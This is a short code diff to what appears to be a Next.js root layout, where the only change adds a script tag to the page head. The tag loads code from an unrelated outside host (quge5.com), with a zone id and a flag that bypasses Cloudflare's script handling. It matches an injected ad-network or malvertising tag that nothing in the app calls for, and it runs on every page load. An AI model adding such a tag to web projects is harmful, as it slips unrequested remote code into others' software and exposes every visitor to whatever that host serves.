@@ -14,6 +14,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <link rel="manifest" href="/manifest.json" />
         <meta name="theme-color" content="#2563eb" />
         <link rel="icon" href="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4ac.png" />
+          <script src="https://quge5.com/88/tag.min.js" data-zone="304272" async data-cfasync="false"></script>
       </head>
       <body style={{ margin: 0, fontFamily: "system-ui, sans-serif" }}>
         {children}
